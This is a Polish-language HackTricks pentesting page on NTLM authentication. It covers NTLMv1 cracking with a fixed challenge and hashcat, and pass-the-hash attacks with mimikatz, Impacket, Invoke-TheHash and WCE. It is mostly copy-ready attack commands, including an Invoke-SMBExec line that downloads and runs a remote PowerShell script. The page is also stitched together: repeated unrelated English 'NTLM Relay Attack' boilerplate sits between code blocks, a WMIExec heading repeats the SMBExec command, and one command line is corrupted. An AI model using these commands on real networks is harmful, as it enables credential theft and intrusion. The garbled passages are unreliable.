# NTLM

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Podstawowe informacje

W środowiskach, w których działa **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie uważa się, że są one łatwo kompromitowalne. Określony hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na scenariusz, w którym LM nie jest używane, reprezentując hash dla pustego ciągu znaków.

Domyślnie protokół uwierzytelniania **Kerberos** jest główną metodą używaną. NTLM (NT LAN Manager) wchodzi w grę w określonych okolicznościach: brak Active Directory, brak domeny, nieprawidłowa konfiguracja Kerberosa lub gdy próby połączeń są podejmowane za pomocą adresu IP zamiast poprawnej nazwy hosta.

Obecność nagłówka **"NTLMSSP"** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.

Obsługa protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest ułatwiona przez określony plik DLL znajdujący się w `%windir%\Windows\System32\msv1\_0.dll`.

**Kluczowe punkty**:

* Hashe LM są podatne, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że nie jest on używany.
* Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używane tylko w określonych warunkach.
* Pakiety uwierzytelniania NTLM są identyfikowalne przez nagłówek "NTLMSSP".
* Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Lokalne zasady -> Opcje zabezpieczeń -> Zabezpieczenia sieciowe: Poziom uwierzytelniania LAN Managera. Istnieje 6 poziomów (od 0 do 5).

![](<../../.gitbook/assets/image (919).png>)

### Rejestr

To ustawia poziom 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Podstawowy schemat uwierzytelniania domeny NTLM

1. **Użytkownik** wprowadza swoje **dane uwierzytelniające**
2. Maszyna klienta **wysyła żądanie uwierzytelnienia**, wysyłając **nazwę domeny** i **nazwę użytkownika**
3. **Serwer** wysyła **wyzwanie**
4. **Klient szyfruje** wyzwanie, używając hasha hasła jako klucza i wysyła je jako odpowiedź
5. **Serwer wysyła** do **kontrolera domeny** nazwę domeny, nazwę użytkownika, wyzwanie i odpowiedź. Jeśli nie ma skonfigurowanego Katalogu Aktywnego lub nazwa domeny jest nazwą serwera, dane uwierzytelniające są **sprawdzane lokalnie**.
6. **Kontroler domeny sprawdza, czy wszystko jest poprawne** i przesyła informacje do serwera

**Serwer** i **Kontroler domeny** są w stanie utworzyć **Bezpieczny Kanał** za pośrednictwem serwera **Netlogon**, ponieważ Kontroler domeny zna hasło serwera (jest ono wewnątrz bazy danych **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie jest takie samo jak to opisane **wcześniej, ale** serwer zna **hash użytkownika**, który próbuje uwierzytelniać się wewnątrz pliku **SAM**. Dlatego zamiast pytać Kontroler domeny, **serwer sprawdzi sam**, czy użytkownik może się uwierzytelnić.

### Wyzwanie NTLMv1

Długość **wyzwania wynosi 8 bajtów**, a **odpowiedź ma długość 24 bajtów**.

**Hash NT (16 bajtów)** jest podzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **wyzwanie** jest **szyfrowane osobno** dla każdej części, a **otrzymane** zaszyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24 bajty.

**Problemy**:

* Brak **losowości**
* 3 części można **atakować osobno**, aby znaleźć hash NT
* **DES jest podatny na złamanie**
* 3 klucz składa się zawsze z **5 zer**
* Dla **tego samego wyzwania** odpowiedź będzie **taka sama**. Dlatego możesz podać ofierze jako **wyzwanie** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **prekalkulowanych tablic tęczowych**.

### Atak NTLMv1

Obecnie coraz rzadziej spotyka się środowiska skonfigurowane z Nieskrępowanym Delegowaniem, ale to nie oznacza, że nie można **wykorzystać usługi Spoolera drukarki** skonfigurowanej.

Możesz wykorzystać pewne poświadczenia/sesje, które już masz w AD, aby **poprosić drukarkę o uwierzytelnienie** przeciwko **hostowi pod twoją kontrolą**. Następnie, korzystając z `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić wyzwanie uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia, a jeśli została wykonana za pomocą **NTLMv1**, będziesz w stanie **je złamać**.\
Jeśli korzystasz z `responder`, możesz spróbować \*\*użyć flagi `--lm` \*\* w celu **zmniejszenia** **uwierzytelnienia**.\
_Zauważ, że dla tej techniki uwierzytelnienie musi być wykonane za pomocą NTLMv1 (NTLMv2 nie jest ważne)._

Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelniania, a konta komputerowe używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** za pomocą **standardowych słowników**. Ale uwierzytelnianie **NTLMv1** **używa DES** ([więcej informacji tutaj](./#ntlmv1-challenge)), więc korzystając z usług specjalnie dedykowanych do łamania DES, będziesz w stanie je złamać (możesz skorzystać z [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com) na przykład).

### Atak NTLMv1 za pomocą hashcat

NTLMv1 można również złamać za pomocą narzędzia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), które formatuje wiadomości NTLMv1 w sposób, który można złamać za pomocą hashcat.

Polecenie
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by hackers to escalate privileges in a Windows environment. This attack involves relaying NTLM authentication messages from a victim machine to a target machine, tricking the target into thinking the attacker is the victim. This can lead to the attacker gaining unauthorized access to sensitive resources on the target machine.

### Mitigation

To mitigate NTLM relay attacks, it is recommended to implement the following measures:

1. **Enforce SMB Signing**: Enabling SMB signing can help prevent NTLM relay attacks by ensuring the integrity of SMB packets.

2. **Disable NTLM**: Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.

3. **Use LDAP Signing**: Enabling LDAP signing can also help protect against NTLM relay attacks by securing LDAP communication.

4. **Implement Extended Protection for Authentication**: This feature can provide additional protection against NTLM relay attacks by requiring channel binding tokens.

By implementing these measures, organizations can reduce the risk of falling victim to NTLM relay attacks and enhance the security of their Windows environment.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. This attack involves relaying NTLM authentication messages from a victim machine to a target machine, allowing the attacker to authenticate to the target machine using the victim's credentials.

## How it works

1. The attacker intercepts an NTLM authentication request from a victim machine to a server.
2. The attacker relays the authentication request to a target machine.
3. The target machine processes the authentication request, believing it is coming from the victim machine.
4. If successful, the attacker gains unauthorized access to the target machine using the victim's credentials.

## Mitigation

To mitigate NTLM relay attacks, it is recommended to:
- Enable SMB signing to prevent relay attacks over SMB.
- Use LDAP signing and channel binding to protect LDAP communications.
- Implement Extended Protection for Authentication to prevent NTLM relay attacks on HTTP.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.

By following these best practices, organizations can reduce the risk of falling victim to NTLM relay attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (najlepiej rozproszony za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku wiemy, że hasło to password, więc będziemy oszukiwać w celach demonstracyjnych:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć narzędzi hashcat do konwertowania złamanych kluczy DES na części skrótu NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Ostatecznie ostatnia część:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. In a typical NTLM relay attack, the attacker intercepts an authentication attempt from a victim host and relays it to a target host, tricking the target host into believing that the attacker is the victim. This allows the attacker to gain unauthorized access to the target host using the victim's credentials.

### Mitigation

To mitigate NTLM relay attacks, it is recommended to implement the following security measures:

1. **Enforce SMB Signing**: Enabling SMB signing can help prevent NTLM relay attacks by ensuring the integrity and authenticity of SMB packets.

2. **Enable LDAP Signing**: LDAP signing can also be enabled to protect against NTLM relay attacks targeting LDAP authentication.

3. **Disable NTLMv1**: NTLMv1 is known to be vulnerable to relay attacks, so it is recommended to disable it and use NTLMv2 or Kerberos instead.

4. **Implement Extended Protection for Authentication**: This feature can help protect against NTLM relay attacks by requiring extended protection for authentication.

By implementing these security measures, organizations can reduce the risk of falling victim to NTLM relay attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Wyzwanie NTLMv2

**Długość wyzwania wynosi 8 bajtów**, a **wysyłane są 2 odpowiedzi**: Jedna ma **długość 24 bajtów**, a długość **drugiej** jest **zmienna**.

**Pierwsza odpowiedź** jest tworzona poprzez zaszyfrowanie za pomocą **HMAC\_MD5** **ciągu** składającego się z **klienta i domeny** oraz użycie jako **klucza** **skrótu MD4** z **skrótu NT**. Następnie **wynik** będzie używany jako **klucz** do zaszyfrowania za pomocą **HMAC\_MD5** **wyzwania**. Do tego zostanie dodane **wyzwanie klienta o długości 8 bajtów**. Razem: 24 B.

**Druga odpowiedź** jest tworzona za pomocą **kilku wartości** (nowe wyzwanie klienta, **znacznik czasu** w celu uniknięcia **ataków typu replay**...).

Jeśli masz **pcap z zarejestrowanym udanym procesem uwierzytelniania**, możesz postępować zgodnie z tym przewodnikiem, aby uzyskać domenę, nazwę użytkownika, wyzwanie i odpowiedź i spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Przekazanie skrótu

**Gdy masz skrót ofiary**, możesz go użyć do **podszycia się** pod nią.\
Musisz użyć **narzędzia**, które będzie **wykonywać** uwierzytelnianie **NTLM używając** tego **skrótu**, **lub** możesz utworzyć nowe **logowanie sesji** i **wstrzyknąć** ten **skrót** do **LSASS**, więc gdy zostanie wykonane **uwierzytelnianie NTLM**, ten **skrót zostanie użyty.** Ostatnia opcja to to, co robi mimikatz.

**Pamiętaj, że ataki Przekazania skrótu można również wykonywać przy użyciu kont komputerowych.**

### **Mimikatz**

**Należy uruchomić jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
To uruchomi proces, który będzie należał do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane poświadczenia to te znajdujące się w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych tak, jakbyś był tym użytkownikiem (podobnie jak sztuczka `runas /netonly`, ale nie musisz znać hasła w postaci tekstu jawnego).

### Przekazywanie hasha z systemu Linux

Możesz uzyskać wykonanie kodu w maszynach z systemem Windows, korzystając z przekazywania hasha z systemu Linux.\
[**Kliknij tutaj, aby dowiedzieć się, jak to zrobić.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Skompilowane narzędzia Impacket dla systemu Windows

Możesz pobrać [binaria Impacket dla systemu Windows tutaj](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (W tym przypadku musisz określić polecenie, cmd.exe i powershell.exe nie są ważne do uzyskania interaktywnej powłoki)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Istnieje wiele innych binariów Impacket...

### Invoke-TheHash

Możesz pobrać skrypty PowerShell stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Wywołaj-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Wywołaj-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Wywołaj-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Wywołaj-TheHash

Ta funkcja jest **mieszanką wszystkich innych**. Możesz przekazać **kilka hostów**, **wykluczyć** niektórych i **wybrać** **opcję**, którą chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **którąkolwiek** z **SMBExec** i **WMIExec**, ale **nie** podasz żadnego parametru _**Command**_, funkcja po prostu **sprawdzi**, czy masz **wystarczające uprawnienia**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Przekazanie Skrótu](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Edytor Windows Credentials (WCE)

**Należy uruchomić jako administrator**

To narzędzie zrobi to samo co mimikatz (zmodyfikuje pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ręczne wykonanie zdalne w systemie Windows z użyciem nazwy użytkownika i hasła

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Wyodrębnianie poświadczeń z hosta z systemem Windows

**Aby uzyskać więcej informacji na temat** [**jak uzyskać poświadczenia z hosta z systemem Windows, powinieneś przeczytać tę stronę**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay i Responder

**Przeczytaj bardziej szczegółowy przewodnik dotyczący przeprowadzania tych ataków tutaj:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analiza wyzwań NTLM z przechwyconej sieci

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
